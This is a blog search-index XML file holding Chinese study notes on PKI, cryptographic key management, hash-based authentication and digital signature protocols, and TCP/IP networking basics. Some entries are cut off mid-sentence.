<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title></title>
    <link href="/2023/04/20/%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86%E2%80%94%E2%80%94PKI%E7%AE%80%E4%BB%8B/"/>
    <url>/2023/04/20/%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86%E2%80%94%E2%80%94PKI%E7%AE%80%E4%BB%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="密钥管理——PKI简介"><a href="#密钥管理——PKI简介" class="headerlink" title="密钥管理——PKI简介"></a>密钥管理——PKI简介</h1><p>PKI——Public Key Infrastructure</p><p>PKI是一种遵循标准的利用公钥加密技术为电子商务的开展提供一套安全基础平台的技术和规范。它能够为所有网络应用提供加密和数字签名等密码服务及所必需的密钥和证书管理体系。</p><p>确立可信赖的数字身份，其核心是信任关系的管理</p><h2 id="一、PKI基本术语"><a href="#一、PKI基本术语" class="headerlink" title="一、PKI基本术语"></a>一、PKI基本术语</h2><p><strong>CA：</strong>一个被单个或多个用户信任的权威机构，它创建和分配公钥证书。CA可以随意创建用户的密钥，但需要对其负责。</p><p><strong>RA：</strong>注册中心，一个可选的实体，负责一些主题注册所需的工作。</p><p><strong>PKC：</strong>公钥证书，一个数据结构，包括一个终端实体的公钥和一些其他信息，这些信息时由发布它的CA私钥数字签署的。在PKIX中，PKC是一个公钥证书</p><p><strong>Internet X.509 Public Key Infrastructure（简称PKIX)</strong></p><p><strong>X.509：</strong>一个由ITU-T(ISO/IEC)针对公钥证书和属性证书框架提出的建议</p><p><strong>Repository(存储库)：</strong>一个数据库，可以存储证书或CRLs等信息，允许进行不可靠的信息检索，存储库应该包括目录服务，但不限于目录服务。</p><p><img src="/2023/04/20/%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86%E2%80%94%E2%80%94PKI%E7%AE%80%E4%BB%8B/image-20230420111719440.png" alt="逻辑框架"></p><h2 id="二、PKI的基本功能"><a href="#二、PKI的基本功能" class="headerlink" title="二、PKI的基本功能"></a>二、PKI的基本功能</h2><p>假设Alice要跟Bob安全的通信，但是她还没有获得自己的通信所需的密钥和证书：</p><p>（1）Alice首先通过类似RSA的公钥算法产生一个公/私钥对。然后她3创建一个证书请求，这个请求包括一个Alice的唯一名字，可能还包括与她相关的其它的附加信息，这个请求还包括Alice的公钥。</p><p>（2）Alice必须使用注册中心的公钥加密此请求然后将其提交给注册中心，或者通过不同频道信号传输完成这一步骤</p><p>（3）接下来，注册中心要决定是否批准这个请求，结果将是批准或不批准</p><p>（4）如果批准，那么这个请求</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2023/04/20/%E5%AF%86%E7%A0%81%E5%AD%A6%E2%80%94%E2%80%94%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86/"/>
    <url>/2023/04/20/%E5%AF%86%E7%A0%81%E5%AD%A6%E2%80%94%E2%80%94%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="密码学——密钥管理"><a href="#密码学——密钥管理" class="headerlink" title="密码学——密钥管理"></a>密码学——密钥管理</h1><h2 id="一、密钥的种类"><a href="#一、密钥的种类" class="headerlink" title="一、密钥的种类"></a>一、密钥的种类</h2><blockquote><p>（1）基本密钥：初始密钥，由用户选定或系统分配 ，可较长时间内由一对用户专门使用的密钥。</p><p>（2）会话密钥：两个通信用户在一次同喜或交换数据时所用的密钥</p><p>（3）密钥加密密钥：对会话或文件密钥进行加密的密钥，又称为次主密钥</p><p>（4）主机主密钥：对秘钥加密密钥进行加密的密钥，存于主机处理器中</p></blockquote><h2 id="二、密钥的生成"><a href="#二、密钥的生成" class="headerlink" title="二、密钥的生成"></a>二、密钥的生成</h2><p><strong>密钥的长度与安全性</strong>：安全性要求高的，密钥长度长</p><p>好的密钥真正随机、等概；避免使用特定算法的弱密钥；双钥系统的密钥更难产生，因为必须满足一定的数学关系；为了便于记忆，密钥不能选得过长，而且不可能选完全随机的数字串，要选用易记而难猜中的密钥；采用散列函数，密钥的生成与算法有关，如果生成的密钥强度不一致，则称该算法构成的是非线性密钥空间；否则称为线性密钥空间。</p><p><strong>生成方式</strong>有两种方案：集中式和分散式</p><p>集中式：传统的密钥分发中心KDC和证书分发中心CDC等方案</p><p>分散式：有个人产生</p><p><strong>密钥的注入</strong></p><p><strong>（1）主机主密钥：</strong>直接或间接注入，注入时须有电磁屏蔽，注入后不能再读出（但可间接验证）</p><p><strong>（2）密钥加密密钥：</strong>直接或间接注入，注入时须有电磁屏蔽，装入后不能再读出，可联机或间接验证</p><p><strong>（3）初始密钥：</strong>直接或间接注入，注入后不能再读出，可联机验证</p><h2 id="二、密钥的分配"><a href="#二、密钥的分配" class="headerlink" title="二、密钥的分配"></a>二、密钥的分配</h2><p><strong>密钥的分配是指产生并使使用者获得密钥的过程。</strong>由于任何密钥都有使用期限，因此密钥的定期更换是密钥管理的一个基本任务。为了尽可能地减少人的参与，密钥的分配需要尽可能地自动进行。</p><p><strong>密钥的传递分为集中传送和分散传送两类。</strong>集中传送是指将密钥整体传送，这时需要使用主密钥来保护会话密钥的传递，并通过安全渠道传递主密钥。分散传送是指将密钥分解成多个部分，用秘密分享的方式传递，而且只要有一部分到达即可复原。分散传送方式适用于在不安全信道中传递密钥的情形。</p><h2 id="密钥的存储"><a href="#密钥的存储" class="headerlink" title="密钥的存储"></a>密钥的存储</h2><p>密钥在多数时间处于静态，因此对密钥的保存是密钥管理重要内容。密钥可以作为一个整体进行保存，也可化为部分进行保存。</p><p>· 密钥的硬件存储</p><p>· 使用门限方案的密钥保存</p><p>· 公钥在公用媒体中存储</p><h3 id="1-密钥的硬件存储"><a href="#1-密钥的硬件存储" class="headerlink" title="1. 密钥的硬件存储"></a>1. 密钥的硬件存储</h3><p><img src="/2023/04/20/%E5%AF%86%E7%A0%81%E5%AD%A6%E2%80%94%E2%80%94%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86/image-20230420103210667.png" alt="密钥的硬件存储"></p><p>好处：是攻击者无法接触它们。因为令牌通常保存在个人手中，并不连接到网络中，只有当用户要使用它的令牌时，才将其连接到他的计算机上，但是连接到网络上这个短暂的时间相比一整天来说，安全性还是有的。</p><h3 id="2-使用门限方案的密钥管理"><a href="#2-使用门限方案的密钥管理" class="headerlink" title="2. 使用门限方案的密钥管理"></a>2. 使用门限方案的密钥管理</h3><p>门限方案（也称秘密共享或秘密分享）。通常将秘密（比如密钥）被分割成几份，某些份额必须结合在一起才能恢复秘密。例如，一个秘密可以分成5份，任何3份都可以结合以重新产生该值。</p><h3 id="3-公钥在公用媒体中存储"><a href="#3-公钥在公用媒体中存储" class="headerlink" title="3. 公钥在公用媒体中存储"></a>3. 公钥在公用媒体中存储</h3><p>将公钥存储在公用媒体中，以保证能方便获得公钥，公用媒体首先是可信的第三方。但在公用媒体中存储的方法需要解决密钥传递技术，以获取对方的公钥。还要解决公用媒体的安全技术，即数据库的安全问题。</p><h2 id="密钥管理"><a href="#密钥管理" class="headerlink" title="密钥管理"></a>密钥管理</h2><h3 id="1-密钥的寿命"><a href="#1-密钥的寿命" class="headerlink" title="1. 密钥的寿命"></a>1. 密钥的寿命</h3><p><strong>（1）密钥不能无期限使用</strong></p><p>密钥使用的时间越久，泄密的机会已越大，由泄露造成的损失就越大</p><p><strong>（2）密钥必须定期更换</strong></p><p>更换时间取决于给定时间内待加密数据的数量、加密的次数和密钥的种类</p><h3 id="2-秘密共享办法"><a href="#2-秘密共享办法" class="headerlink" title="2. 秘密共享办法"></a>2. 秘密共享办法</h3><p><strong>（1）利用人工信道实现：</strong>密钥分路传递，最终密钥接收重组</p><p><strong>（2）网内分配密钥方式：</strong>利用密码技术自动分配密钥方式。它可分为两种：一种是<strong>在用户之间直接分配密钥</strong>，即一个通信主体可向另一个通信主体传送在一次对话中要使用的会话密钥。另一种是<strong>设立一个密钥分配中心（KDC）</strong>，通过KDC来分配密钥，这种方法使用得较多</p><p><strong>（3）利用物理现象实现：</strong>基于量子密钥的密钥分配方法，它是利用物理现象实现的。密码学的信息理论研究指出，通信双方A到B可通过先期精选、信息协调、保密增强等密码技术实现使A和B共享一定的秘密信息，而窃听者对其一无所知。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>散列函数与认证、数字签名</title>
    <link href="/2023/04/09/%E6%95%A3%E5%88%97%E5%87%BD%E6%95%B0%E4%B8%8E%E8%AE%A4%E8%AF%81%E3%80%81%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/"/>
    <url>/2023/04/09/%E6%95%A3%E5%88%97%E5%87%BD%E6%95%B0%E4%B8%8E%E8%AE%A4%E8%AF%81%E3%80%81%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/</url>
    
    <content type="html"><![CDATA[<h1 id="散列函数与认证"><a href="#散列函数与认证" class="headerlink" title="散列函数与认证"></a>散列函数与认证</h1><h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>保密服务与认证服务的区别：</p><p>保密的目的是防止对手破译系统中的机密信息；</p><p>认证是防止主动攻击的重要技术，如伪装、窜扰等，包括对消息的内容、顺序和时间的篡改以及重发。</p><p>认证分为：<code>实体认证</code>：验证消息的发送者是真的，而不是冒充的，包括信源，信宿等的认证和识别。<code>消息认证</code>：验证消息的完整性，验证数据在传送或存储过程中未被篡改，重放或延迟等。</p><h2 id="二、认证函数"><a href="#二、认证函数" class="headerlink" title="二、认证函数"></a>二、认证函数</h2><p>认证系统的工作原理：发送方利用底层的认证函数产生一个用来认证的认证标识。消息接收方利用上层的认证协议基于认证标识验证真实性。</p><p>认证函数的分类：</p><p><strong>加密函数：</strong>用整个消息的密文作为消息认证的认证标识；</p><p><strong>消息认证码（MAC）：</strong>指消息被一密钥控制的公开函数作用后产生的，用作认证符的，固定长度的数值，也称为密码校验和。</p><p><strong>散列函数：</strong>一个不需要密钥的公开函数，将任意长度的输入消息映射成一个固定长度的输出值，并以此值作为认证标识。</p><h2 id="三、认证"><a href="#三、认证" class="headerlink" title="三、认证"></a>三、认证</h2><h3 id="3-1-基于消息加密的认证"><a href="#3-1-基于消息加密的认证" class="headerlink" title="3.1 基于消息加密的认证"></a>3.1 基于消息加密的认证</h3><p>采用对称加密体制实现加密和认证：基于密钥的保密性。</p><p>对称加密体制实现认证的不足：</p><p>（1）额外的差错检验：确保消息的完整性—帧校验序列</p><p>（2）不提供数字签名：接收方可以伪造，发送方可以否认</p><p>采用非对称加密体制实现认证：基于私钥的保密性，提供数字签名的同时，可以实现认证。</p><p>不足：</p><p>一次完整的通信需要执行公钥算法的加密，解密操作各两次</p><h3 id="3-2-消息认证码"><a href="#3-2-消息认证码" class="headerlink" title="3.2 消息认证码"></a>3.2 消息认证码</h3><p>指消息被一密钥控制的公开函数作用后产生的，用作认证符的，固定长度的数值，也称为密码校验和。</p><p>消息认证码工作原理</p><blockquote><p>通信双方共享一个密钥k；</p><p>发送者使用密钥k和明文m一起产生一个短小的定长数据分组MAC=C~k~(m)</p><p>接受者执行步骤二，将结果与收到的MAC进行比对。如果二者相等，则可判断。接受者确信报文未被更改过；接受者确信报文来自声称的发送者。</p><p>反之，则认证不通过（身份无效或消息无效）</p></blockquote><p>MAC实现认证的不足：</p><p>（1）不提供数字签名(认证编码和认证译码密钥相同，简单一点说就是接收方可以伪造)</p><p>（2）不提供消息机密性（MAC函数无需可逆）</p><p>改进版本：</p><p>在产生MAC之前或者之后实现加密机制，以提供消息机密性</p><p>（1）与明文相关：E~k2~(m||C~k1~(m))</p><p>（2）与密文相关：E~k2~(m)||C~k1~(E~k2~(m))</p><h3 id="3-3-基于散列函数的认证"><a href="#3-3-基于散列函数的认证" class="headerlink" title="3.3 基于散列函数的认证"></a>3.3 基于散列函数的认证</h3><p><strong>散列函数H：</strong>是一种公开的单向密码体制函数，将任意长的消息映射位较短的，固定长度的值H(m)，又被称为HASH函数</p><p>（1）单向性：将明文映射到密文，并且映射是不可逆的。</p><p>（2）固定长度性：可以将任意长度的输入映射为固定长度的输出。</p><p>散列函数在数据完整性验证，数字签名等领域有广泛的应用。</p><h1 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h1><h2 id="一、数字签名基本概念"><a href="#一、数字签名基本概念" class="headerlink" title="一、数字签名基本概念"></a>一、数字签名基本概念</h2><p>为什么需要数字签名？</p><p>基于消息认证码的通信方式。B伪造一个消息，并且使用与A共享的密钥产生该消息的认证码，并声称该消息来自A；由于B有可能伪造A发送的消息，A就可以对自己发送过的消息予以否认。</p><h2 id="二、产生方式"><a href="#二、产生方式" class="headerlink" title="二、产生方式"></a>二、产生方式</h2><h3 id="2-1-加密算法产生数字签名"><a href="#2-1-加密算法产生数字签名" class="headerlink" title="2.1 加密算法产生数字签名"></a>2.1 加密算法产生数字签名</h3><p>将消息或者消息的摘要加密后的密文作为对该消息的数字签名</p><p><strong>单钥加密方式（保密性和认证性）</strong></p><p><img src="/2023/04/09/%E6%95%A3%E5%88%97%E5%87%BD%E6%95%B0%E4%B8%8E%E8%AE%A4%E8%AF%81%E3%80%81%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/image-20230409212755313.png" alt="单钥加密方式"></p><p><strong>公钥加密方式（①认证性和签名②认证性、保密性和签名）</strong></p><p><img src="/2023/04/09/%E6%95%A3%E5%88%97%E5%87%BD%E6%95%B0%E4%B8%8E%E8%AE%A4%E8%AF%81%E3%80%81%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/image-20230409212822345.png" alt="公钥加密方式"></p><h3 id="2-2-签名算法产生数字签名"><a href="#2-2-签名算法产生数字签名" class="headerlink" title="2.2 签名算法产生数字签名"></a>2.2 签名算法产生数字签名</h3><p>输入：消息M和密钥K</p><p>输出：数字签名S=Sig~k~(M)</p><p>验证的时候，只需要对M对它进行一次签名，判断是否和传过来的S相同即可。</p><p>算法的安全性在于难以推出密钥k或伪造一个消息M’而验证（S,M’)为真</p><h3 id="三、执行方式"><a href="#三、执行方式" class="headerlink" title="三、执行方式"></a>三、执行方式</h3><h3 id="3-1-直接执行的数字签名"><a href="#3-1-直接执行的数字签名" class="headerlink" title="3.1 直接执行的数字签名"></a>3.1 直接执行的数字签名</h3><p><strong>直接明文签名</strong></p><p>A—&gt;B：E~sk_a~(m)</p><p>A—&gt;B：E~k~[E~sk_a~(m)]</p><p><strong>消息摘要签名</strong></p><p>A—&gt;B：m||E~sk_a~[H(m)]</p><p>A—&gt;B：E~k~[m||E~sk_a~[H(m)]或A—&gt;B：E~k~[m]||E~sk_a~[H(m)]</p><p>直接执行的签名的不足：</p><p>（1）验证依赖于发送方的私有密钥</p><p>发送方可能会声称其私有密钥丢失或被窃，从而别人伪造了他的签名；被签名的消息包含一个由公正的第三方生成的时间戳；要求密钥一旦泄露，立即报告给授权中心——CRL列表宣告失效。</p><p>（2）”向前“不安全性</p><p>密钥在时间T被窃取，敌手可以伪造早于或等于时间T的时间戳。</p><h3 id="3-2-可仲裁数字签名"><a href="#3-2-可仲裁数字签名" class="headerlink" title="3.2 可仲裁数字签名"></a>3.2 可仲裁数字签名</h3><p>可仲裁数字签名在通信双方的基础上引入仲裁者</p><p>所有发送者的签名消息首先发送给仲裁者；仲裁者对消息和签名进行一系列的测试，主要检查来源和内容的真实性，完整性，<strong>附加时间戳（有效避免重放攻击）</strong>，将签名||时间戳一起发给接收者。</p><p>前提条件：所有的通信参与者必须绝对相信仲裁者。</p><h3 id="3-3-单密钥可仲裁数字签名（仲裁者可获知消息）"><a href="#3-3-单密钥可仲裁数字签名（仲裁者可获知消息）" class="headerlink" title="3.3 单密钥可仲裁数字签名（仲裁者可获知消息）"></a>3.3 单密钥可仲裁数字签名（仲裁者可获知消息）</h3><p>发送者、接收者分别与仲裁者共享密钥k~ax~、k~bx~</p><p>（1）Alice计算H(m)和S=E~k_ax~[ID~Alice~||H(m)]，并将m||S发送给仲裁者；</p><p>（2）仲裁者X解密S，用H(m)验证m</p><p>（3）仲裁者X计算E~k_bx~[ID~Alice~||m||E~k_ax~[ID~Alice~||H(m)]||T]，并将结果发送给接收者Bob;</p><p>（4）接收者Bob解密仲裁者X发来的消息，并可将m和签名保存起来。</p><h3 id="3-4-单密钥可仲裁数字签名（仲裁者不能获知消息）"><a href="#3-4-单密钥可仲裁数字签名（仲裁者不能获知消息）" class="headerlink" title="3.4 单密钥可仲裁数字签名（仲裁者不能获知消息）"></a>3.4 单密钥可仲裁数字签名（仲裁者不能获知消息）</h3><p>发送者、接收者共享密钥K~ab~，发送者、接收者分别与仲裁者共享密钥K~ax~、K~bx~</p><p>（1）Alice计算E~k_ab~[m]、E~k_ax~[ID~Alice~||H(E~k_ab~(m))]，并将如下消息发送给仲裁者：ID~Alice~||E~k_ab~[m]||E~k_ax~[ID~Alice~||H(E~k_ab~(m))] ；</p><p>（2）仲裁者<em>X</em>解密签名，用E~k_ax~[ID~Alice~||H(E~k_ab~(m))]验证消息；</p><p>（3）仲裁者<em>X</em>计算E~k_bx~[ID~Alice~||E~k_ab~[m]||E~k_ax~[ID~Alice~||H(E~k_ab~(m))]||T]，并将结果发送给接收者Bob；</p><p>（4）接收者Bob解密仲裁者X发来的消息，并可将m和签名保存起来。</p><p><strong>单密钥签名方案的弊端：</strong>（1）仲裁者可以联手发送者进行否认。（2）仲裁者可以联手接收者进行伪造</p><h3 id="3-5-双密钥可仲裁数字签名（仲裁者不能获知消息）"><a href="#3-5-双密钥可仲裁数字签名（仲裁者不能获知消息）" class="headerlink" title="3.5 双密钥可仲裁数字签名（仲裁者不能获知消息）"></a>3.5 双密钥可仲裁数字签名（仲裁者不能获知消息）</h3><p>发送者、接收者分别拥有公私钥对(sk~Alice~, pk~Alice~)、(sk~Bob~, pk~Bob~)</p><p>（1）Alice计算S=E~sk_Alice~[ID~Alice~||E~pk_Bob~(E~sk_Alice~(m))]，并将ID~Alice~||S发送给仲裁者；</p><p>（2）仲裁者X检查Alice的公私钥对的有效性</p><p>（3）仲裁者X检查E~sk_x~[ID~Alice~||E~pk_Bob~(E~sk_Alice~(m))||T]，并将结果发送给接收者Bob</p><p>（4）接收者Bob解密仲裁者X发来的消息，并可将m和签名保存起来</p><p>通信之前各方无需共享任何信息，避免了合谋攻击。</p><p>即使Alice的私钥被窃取，只要仲裁者的私钥未被窃取，时间戳就不能被伪造；</p><p>消息对除Alice和Bob之外的所有人保持机密性</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>图解TCP/IP协议学习</title>
    <link href="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/"/>
    <url>/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="图解TCP-IP协议学习"><a href="#图解TCP-IP协议学习" class="headerlink" title="图解TCP/IP协议学习"></a>图解TCP/IP协议学习</h1><h2 id="第一章-网络基础知识"><a href="#第一章-网络基础知识" class="headerlink" title="第一章 网络基础知识"></a>第一章 网络基础知识</h2><p>计算机网络根据<strong>规模</strong>可以分为<strong>WAN(Wide Area Nerwork，广域网)和LAN(Local Area Network，局域网)</strong></p><p>计算机与网络发展的7个阶段：</p><p><strong>（1）批处理：</strong>事先将用户程序和数据装入卡带或磁带，并由计算机按照一定的顺序读取，使用户所要执行的这些程序和数据能够一并批量得到处理的方式。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230329155056754.png" alt="批处理"></p><p><strong>（2）分时系统(TSS)：</strong>指多个终端与同一个计算机连接，允许多个用户同时使用一台计算机的系统。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230329155551134.png" alt="分时系统"></p><p><strong>（3）计算机之间的通信：</strong>计算机与计算机之间由通信线路连接，人们能够很轻松地即时读取另一台计算机中的数据，从而极大地缩短了传送数据的时间。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230329155826451.png" alt="计算机之间的通信"></p><p><strong>（4）计算机网络的产生：</strong></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230329160038835.png" alt="计算机网络的产生"></p><p>互连多种计算机的网络诞生，让各式各样的计算机相互连接，从大型的超级计算机或主机到小型的个人电脑。</p><p><strong>（5）互联网的普及：</strong>一人一机</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230329160558473.png" alt="互联网的普及"></p><p><strong>（6）以互联网技术为中心的时代：</strong></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230329160631657.png" alt="以互联网技术为中心的时代"></p><p><strong>（7）从“单纯建立连接”到“安全建立连接”</strong></p><h3 id="1-1-协议"><a href="#1-1-协议" class="headerlink" title="1.1 协议"></a>1.1 协议</h3><p>协议就是计算机与计算机之间通过网络实现通信时事先达成的一种“约定”，只要遵循相同的协议就能实现通信；反之，如果使用的协议不同，就无法实现通信。</p><p><strong>分组交换协议：</strong>分组交换是指将一个大数据分割为一个个叫做包的较小单位进行传输的方法。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230329161541019.png" alt="分组交换"></p><p>每一个分组中附加上的源主机地址和目标主机地址送给通信线路，这些发送端地址、接收端地址以及分组序号写入的部分称为”<strong>报文首部</strong>“。</p><p>分组序号是为了辨别这个分组是原始数据的哪一部分，按照相应的序号将分组重新装配为原始数据。</p><p>而通信协议就是用来规定报文首部应该写入哪些信息、应该如何处理这些信息……</p><p><strong>协议的分层</strong></p><p>分层可以将每个分层独立使用，即使系统中某些分层发生变化，也不会波及到整个系统，因此可以构建一个扩展性和灵活性都较强的系统。此外，分层可以细分通信功能，更易于单独实现每个分层的协议，并界定各个分层的具体责任和义务；但是过分的模块化，使处理变得更加沉重以及每个模块都不得不实现相似的处理逻辑。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230329162128558.png" alt="协议的分层"></p><p><strong>OSI参考模型</strong></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230329162607293.png" alt="OSI参考模型"></p><p><strong>OSI参考模型中各个层的作用</strong></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230329180221366.png" alt="OSI参考模型中各个层的作用"></p><p><strong>应用层：</strong>为应用程序提供服务并规定应用程序中通信相关的细节</p><p><strong>表示层：</strong>将应用处理的信息转换为适合网络传输的格式，或将来自下一层的数据转换为上层能够处理的格式，主要负责数据格式的转换</p><p><strong>会话层：</strong>负责建立和断开通信连接以及数据的分割等数据传输相关的管理</p><p><strong>传输层：</strong>起着可靠传输的作用。只在通信双方结点上进行处理，而无需在路由器上处理</p><p><strong>网络层：</strong>将数据传输到目的地址。目的地址可以使多个网络通过路由器连接而成的某一个地址。主要负责寻址和路由选择</p><p><strong>数据链路层：</strong>负责物理层面上互连的、结点之间的通信传输</p><p><strong>物理层：</strong>负责0、1比特流与电压的高低、光的闪灭之间的互换</p><h3 id="1-2-传输"><a href="#1-2-传输" class="headerlink" title="1.2 传输"></a>1.2 传输</h3><p><code>面向有连接型</code>和<code>面向无连接型</code></p><p><strong>面向有连接型：</strong>在发送数据之前，需要在收发主机之间连接一条通信线路。</p><p><strong>面向无连接型：</strong>不要求建立和断开连接。发送端可于任何时候自由发送数据；反之接收端也永远不知道自己在何时从哪里收到数据。</p><p>网络通信方式：<code>电路交换</code>和<code>分组交换</code></p><blockquote><p><strong>电路交换</strong>：交换机主要负责数据的中转处理，计算机首先被连接到交换机上，而交换机与交换机之间则由众多通信线路再继续连接。计算机在发送数据的时候，需要通过交换机与目标主机建立通信电路，建立好连接之后，用户一直使用这条电路，直到该连接被断开为止</p><p><strong>弊端：</strong>如果一条电路上连接了多台计算机，但是基于电路交换的话某一台计算机会独占线路，其他计算机只能等待，但是又无法预测该台计算机数据传输何时结束，就会造成浪费和拥堵</p><p><strong>分组交换：</strong>让连接到通信电路的计算机将所要发送的数据分成多个数据包，按照一定的顺序排列之后分别发送，就是分组交换。这样提高了通信线路的利用率，由于在分组的过程中，已经在每个分组的首部写入了发送端和接收端的地址，所以即使同一条线路同时为多个用户提供服务，也可以明确区分每个分组数据发往的目的地</p><p>在分组交换中，由分组交换机(路由器)连接通信链路。大致处理过程是：发送端计算机将数据分组发送给路由器，路由器收到这些分组数据以后，缓存到自己的缓冲区，然后再转发给目标计算机。</p><p><strong>弊端：</strong>在分组交换中，计算机与路由器之间以及路由器与路由器之间通常只有一条通信线路。因此，这条线路其实是一条共享线路，所以通信线路的速度可能会有所不同，根据网络拥堵情况，数据达到目标地址的时间有长有短。当路由器的缓存饱和或溢出的时候，可能会出现分组数据丢失，无法发送到对端的情况</p></blockquote><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230329183334166.png" alt="电路交换和分组交换"></p><p>网络通信还可以根据目标地址的个数及其后续的行为对通信进行分类</p><p><strong>单播、广播、多播、任播</strong></p><blockquote><p>单播：1对1通信。固定电话</p><p>广播：将消息从1台主机发送到与之相连的所有其他主机。广播通信</p><p>多播：与广播类似，但是多播要限定某一组主机作为接收端。电视会议</p><p>任播：指在特定的多台主机中选出一台作为接收端的一种通信方式，跟多播有一些相似之处，但是它的行为和多播不同，任播通信从目标主机群中选择一台最符合网络条件的主机作为目标主机发送消息。任播在实际应用中有DNS根域名解析服务器</p></blockquote><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230329184128190.png" alt="单播、广播、多播、任播"></p><h3 id="1-3-地址"><a href="#1-3-地址" class="headerlink" title="1.3 地址"></a>1.3 地址</h3><p>​    一个地址必须明确表示一个主体对象。MAC地址和IP地址在表示一个通信主机时都具有唯一性，但是它们中只有IP地址具有层次性。</p><p>层次性的理解就是，每一部分都具有它自身的含义</p><p>MAC地址中的制造商标识号，产品编号以及通用编号等信息在某种程度上也具有一定的层次性，但是对于寻找地址并没有起到任何作用，所以不能称为层次性。</p><p><strong>IP地址怎样实现分层，为什么说具有层次性？</strong></p><blockquote><p>一方面，IP地址由网络号和主机号两部分组成，即使通信主体的IP地址不同，若主机号不同，网络号相同，说明他们处于同一个网段。同处一个网段的主机也都属于同一个部分或集团组织。另一方面，网络号相同的主机在组织结构、提供商类型和地域分布上都比较集中，也为IP寻址带来了极大的方便。</p></blockquote><p>网络传输中，每个结点都会根据分组数据的地址信息，来判断报文该由哪一个网卡发送出去。为此，各个地址会参考一个发出接口列表。在这一点上MAC寻址和IP寻址是一样的。MAC寻址中所参考的表叫做<strong>地址转发表</strong>，而IP寻址中所参考的叫做<strong>路由控制表</strong></p><p>MAC地址转发表中所记录的是实际的MAC地址，路由表中所记录的IP地址则是集中了之后的网络号</p><h3 id="1-4-网络构成要素"><a href="#1-4-网络构成要素" class="headerlink" title="1.4 网络构成要素"></a>1.4 网络构成要素</h3><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230329185839843.png" alt="网络构成要素"></p><p><strong>通信媒介与数据链路</strong></p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230329190018036.png" alt="通信媒介与数据链路"></p><p><strong>网卡</strong></p><p>一台计算机连接网络的时候，必须要使用网卡(全称为网络接口卡)</p><p><strong>中继器</strong></p><p>物理层面上延长网络的设备，信号在传播过程中可能会受到减弱，所以我们需要对减弱的信号进行放大和发送， 这一项工作就由中继器来做</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230329190442297.png" alt="中继器"></p><p><strong>网桥/2层交换机</strong></p><p>数据链路层面上连接两个网络的设备。</p><p>网桥两边的通信媒介可能是不一样的，比如左边是电缆，右边是光纤。而网桥就是将不同媒介的数据帧进行转换，以实现两个网络之间的数据通信。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230329190551552.png" alt="网桥"></p><p><strong>路由器/3层交换机</strong></p><p>路由器是在OSI模型的第3层—网络层面上连接两个网络、并对分组报文进行转发的设备。</p><p><img src="/2023/03/29/%E5%9B%BE%E8%A7%A3TCPIP%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/image-20230329191329424.png" 